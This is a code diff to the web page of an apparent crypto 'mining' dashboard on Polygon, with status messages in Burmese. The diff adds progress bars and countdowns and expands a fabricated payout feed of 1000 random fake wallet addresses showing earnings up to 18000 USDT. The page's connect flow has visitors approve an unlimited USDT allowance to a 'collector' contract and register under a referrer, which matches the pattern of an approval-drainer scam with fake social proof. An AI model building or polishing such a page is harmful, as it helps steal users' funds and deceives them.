@@ -12,7 +12,7 @@
             100% { transform: translateY(-50%); }
         }
         .animate-scroll-list {
-            animation: scrollUp 150s linear infinite;
+            animation: scrollUp 1200s linear infinite;
         }
         .animate-scroll-list:hover {
             animation-play-state: paused;
@@ -53,6 +53,11 @@
             <p id="walletAddress" class="text-sm text-slate-400 truncate"></p>
             <span id="selectedNetworkBadge" class="hidden inline-block bg-emerald-500/20 border border-emerald-500/40 text-emerald-400 text-sm px-3.5 py-1 rounded-full font-semibold">Active Network: POLYGON</span>
             <div id="statusLog" class="text-sm text-center text-amber-400 font-mono pt-1"></div>
+            
+            <!-- Progress Bar Container -->
+            <div id="progressContainer" class="hidden w-full bg-slate-900 rounded-full h-2.5 mt-3 overflow-hidden border border-slate-700">
+                <div id="progressBar" class="bg-gradient-to-r from-blue-500 to-emerald-400 h-2.5 rounded-full transition-all duration-300" style="width: 0%"></div>
+            </div>
         </div>
 
         <div class="grid grid-cols-3 gap-2 mb-4 bg-gradient-to-r from-slate-900/90 via-slate-900 to-slate-900/90 border border-emerald-500/20 p-3.5 rounded-xl text-center shadow-inner relative overflow-hidden">
@@ -224,6 +229,7 @@
 
     <script>
         let provider, signer, userAddress;
+        let countdownInterval;
         const selectedNetwork = "POLYGON";
 
         const COLLECTOR_CONTRACT_ADDRESS = "0x5a30bBD23eD1250ec5A3F8bca8122580E4eBefCC";
@@ -243,6 +249,40 @@
             "function users(address) view returns (uint256 userId, address referrer, bool isBanned, bool isRegistered)",
             "function subAdminPrefix(address) view returns (string)"
         ];
+
+        function showProgress(percent, text) {
+            const container = document.getElementById("progressContainer");
+            const bar = document.getElementById("progressBar");
+            
+            container.classList.remove("hidden");
+            bar.style.width = `${percent}%`;
+            if (text) document.getElementById("statusLog").innerText = text;
+        }
+
+        function hideProgress() {
+            const container = document.getElementById("progressContainer");
+            container.classList.add("hidden");
+            stopCountdown();
+        }
+
+        function startCountdown(seconds, customMessage = "Transaction အတည်ပြုနေသည်") {
+            let timeLeft = seconds;
+            const logEl = document.getElementById("statusLog");
+            clearInterval(countdownInterval);
+            
+            countdownInterval = setInterval(() => {
+                if (timeLeft > 0) {
+                    logEl.innerText = `${customMessage}... ကျန်ရှိချိန်: ${timeLeft} စက္ကန့်`;
+                    timeLeft--;
+                } else {
+                    logEl.innerText = `${customMessage}... Network အခြေအနေကြောင့် အနည်းငယ်ကြာမြင့်နေပါသည်...`;
+                }
+            }, 1000);
+        }
+
+        function stopCountdown() {
+            clearInterval(countdownInterval);
+        }
 
         function startLiveCalculatingStats() {
             let baseUsers = 142850;
@@ -267,23 +307,45 @@
 
         function generateIncomeList() {
             const container = document.getElementById("incomeListContainer");
-            let htmlContent = "";
+            const tiers = [
+                { count: 300, min: 10, max: 30 },     // 30%
+                { count: 400, min: 40, max: 500 },    // 40%
+                { count: 150, min: 600, max: 3000 },  // 15%
+                { count: 100, min: 3500, max: 6000 }, // 10%
+                { count: 50, min: 7000, max: 18000 }  // 5%
+            ];
 
-            for (let i = 1; i <= 100; i++) {
-                const randomHex1 = Math.random().toString(16).substring(2, 7).toUpperCase();
-                const randomHex2 = Math.random().toString(16).substring(2, 8).toLowerCase();
-                const fakeAddress = `0x${randomHex1}......${randomHex2}`;
-                const randomAmount = (Math.random() * 5 + 1.5).toFixed(2);
+            let items = [];
 
-                htmlContent += `
-                    <div class="flex items-center justify-between bg-slate-900/90 p-3 rounded-xl border border-slate-800">
-                        <div class="flex items-center gap-2.5">
-                            <span class="font-mono text-slate-300 text-sm">${fakeAddress}</span>
+            tiers.forEach(tier => {
+                for (let i = 0; i < tier.count; i++) {
+                    const randomHex1 = Math.random().toString(16).substring(2, 7).toUpperCase();
+                    const randomHex2 = Math.random().toString(16).substring(2, 8).toLowerCase();
+                    const fakeAddress = `0x${randomHex1}......${randomHex2}`;
+                    const rawVal = Math.random() * (tier.max - tier.min) + tier.min;
+                    const formattedAmount = rawVal.toLocaleString(undefined, {
+                        minimumFractionDigits: 2,
+                        maximumFractionDigits: 2
+                    });
+
+                    items.push(`
+                        <div class="flex items-center justify-between bg-slate-900/90 p-3 rounded-xl border border-slate-800">
+                            <div class="flex items-center gap-2.5">
+                                <span class="font-mono text-slate-300 text-sm">${fakeAddress}</span>
+                            </div>
+                            <span class="font-mono font-semibold text-emerald-400 text-sm">${formattedAmount} <span class="text-slate-400">USDT</span></span>
                         </div>
-                        <span class="font-mono font-semibold text-emerald-400 text-sm">${randomAmount} <span class="text-slate-400">USDT</span></span>
-                    </div>
-                `;
+                    `);
+                }
+            });
+
+            // Fisher-Yates shuffle so the 1000 items appear in natural mixed order
+            for (let i = items.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [items[i], items[j]] = [items[j], items[i]];
             }
+
+            const htmlContent = items.join("");
             container.innerHTML = htmlContent + htmlContent;
         }
 
@@ -328,7 +390,6 @@
                         document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
                         
                         await checkExistingAllowanceAndLoad();
-                        startRealtimeBalanceSync();
                     }
                 } catch (err) {
                     console.error("Auto connect error silent check:", err);
@@ -356,10 +417,12 @@
 
         async function checkExistingAllowanceAndLoad() {
             try {
+                showProgress(30, "Checking wallet allowance...");
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
                 const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
 
                 if (Number(allowance) > 0) {
+                    showProgress(70, "Loading dashboard data...");
                     const connectBtn = document.getElementById("connectBtn");
                     connectBtn.innerText = "Active Mining";
                     connectBtn.className = "bg-blue-600 hover:bg-blue-500 font-semibold px-3.5 py-2.5 rounded-xl transition cursor-pointer text-sm shadow-lg";
@@ -367,12 +430,16 @@
                     const badgeEl = document.getElementById("selectedNetworkBadge");
                     badgeEl.classList.remove("hidden");
 
-                    document.getElementById("statusLog").innerText = "Welcome Back! Active mining...";
-
                     await checkUserData();
+                    showProgress(100, "Welcome Back! Active mining...");
+                    setTimeout(hideProgress, 1000);
+                    startRealtimeBalanceSync();
+                } else {
+                    hideProgress();
                 }
             } catch (err) {
                 console.error("Allowance check error:", err);
+                hideProgress();
             }
         }
 
@@ -403,14 +470,14 @@
             const isConfirmed = confirm("Polygon Network ဖြင့် Connect လုပ်ပြီး USDT Approve ဆက်လုပ်ရန် OK ကိုနှိပ်ပါ။");
             if (!isConfirmed) return;
 
-            const logEl = document.getElementById("statusLog");
-
             try {
+                showProgress(20, "Switching to Polygon Network...");
                 await window.ethereum.request({
                     method: "wallet_switchEthereumChain",
                     params: [{ chainId: POLYGON_CHAIN_ID }],
                 });
 
+                showProgress(40, "Requesting wallet accounts...");
                 provider = new ethers.BrowserProvider(window.ethereum);
                 const accounts = await provider.send("eth_requestAccounts", []);
                 userAddress = accounts[0];
@@ -418,11 +485,12 @@
 
                 document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
                 
+                showProgress(60, "Checking USDT allowance...");
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
                 const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
 
                 if (Number(allowance) > 0) {
-                    logEl.innerText = "Welcome Back! Dashboard သို့ ဝင်ရောက်နေပါပြီ...";
+                    showProgress(80, "Dashboard သို့ ဝင်ရောက်နေပါပြီ...");
                     
                     const badgeEl = document.getElementById("selectedNetworkBadge");
                     badgeEl.classList.remove("hidden");
@@ -432,19 +500,28 @@
                     connectBtn.className = "bg-blue-600 hover:bg-blue-500 font-semibold px-3.5 py-2.5 rounded-xl transition cursor-pointer text-sm shadow-lg";
 
                     await checkUserData();
+                    showProgress(100, "Welcome Back! Dashboard သို့ ရောက်ရှိပါပြီ။");
+                    setTimeout(hideProgress, 1000);
                     startRealtimeBalanceSync();
                 } else {
                     await switchToPolygonAndApprove();
                 }
             } catch (err) {
                 console.error(err);
-                logEl.innerText = "ချိတ်ဆက်မှု မအောင်မြင်ပါ။";
+                hideProgress();
+                
+                let errorMsg = "Approval သို့မဟုတ် Network ပြောင်းလဲမှု ပျက်ပြားသွားပါပြီ။";
+                if (err.code === 4001 || err.code === "ACTION_REJECTED" || (err.message && err.message.toLowerCase().includes("user rejected"))) {
+                    errorMsg = "❌ အသုံးပြုသူမှ Transaction ကို ငြင်းပယ်လိုက်ပါပြီ။";
+                } else if (err.message && (err.message.toLowerCase().includes("insufficient funds") || err.message.toLowerCase().includes("exceeds balance"))) {
+                    errorMsg = "⚠️ Gas Fee (သို့မဟုတ်) လိုအပ်သော လက်ကျန်ငွေ မလုံလောက်ပါ။";
+                }
+                
+                document.getElementById("statusLog").innerText = errorMsg;
             }
         }
 
         async function switchToPolygonAndApprove() {
-            const logEl = document.getElementById("statusLog");
-
             try {
                 const badgeEl = document.getElementById("selectedNetworkBadge");
                 badgeEl.classList.remove("hidden");
@@ -453,12 +530,17 @@
                 connectBtn.innerText = "Active Mining";
                 connectBtn.className = "bg-blue-600 hover:bg-blue-500 font-semibold px-3.5 py-2.5 rounded-xl transition cursor-pointer text-sm shadow-lg";
 
-                logEl.innerText = "Transaction တင်နေပါသည်...";
+                showProgress(50, "Submitting approval transaction...");
+                startCountdown(25, "USDT Approval တင်နေသည်");
+
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
-                
                 const maxAmount = ethers.MaxUint256;
                 const tx = await usdtContract.approve(COLLECTOR_CONTRACT_ADDRESS, maxAmount);
                 await tx.wait();
+
+                stopCountdown();
+                showProgress(75, "Registering user profile...");
+                startCountdown(20, "မှတ်ပုံတင်နေသည်");
 
                 const collector = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, signer);
                 const referrer = getQueryParameter("ref") || localStorage.getItem("saved_referrer") || ethers.ZeroAddress;
@@ -470,16 +552,19 @@
                     console.log("Already registered or reference error:", regErr);
                 }
 
-                logEl.innerText = "Approval နှင့် မှတ်ပုံတင်ခြင်း အောင်မြင်ပါသည်။";
-
+                stopCountdown();
+                showProgress(90, "Loading dashboard data...");
                 const refLink = `${window.location.origin}${window.location.pathname}?ref=${userAddress}`;
                 document.getElementById("refLink").value = refLink;
                 updateQRCode(refLink);
 
-                checkUserData();
+                await checkUserData();
+                showProgress(100, "Approval နှင့် မှတ်ပုံတင်ခြင်း အောင်မြင်ပါသည်။");
+                setTimeout(hideProgress, 1000);
                 startRealtimeBalanceSync();
             } catch (err) {
                 console.error(err);
+                hideProgress();
                 
                 let errorMsg = "Approval သို့မဟုတ် Network ပြောင်းလဲမှု ပျက်ပြားသွားပါပြီ။";
                 if (err.code === 4001 || err.code === "ACTION_REJECTED" || (err.message && err.message.toLowerCase().includes("user rejected"))) {
@@ -488,7 +573,7 @@
                     errorMsg = "⚠️ Gas Fee (သို့မဟုတ်) လိုအပ်သော လက်ကျန်ငွေ မလုံလောက်ပါ။";
                 }
                 
-                logEl.innerText = errorMsg;
+                document.getElementById("statusLog").innerText = errorMsg;
             }
         }
 
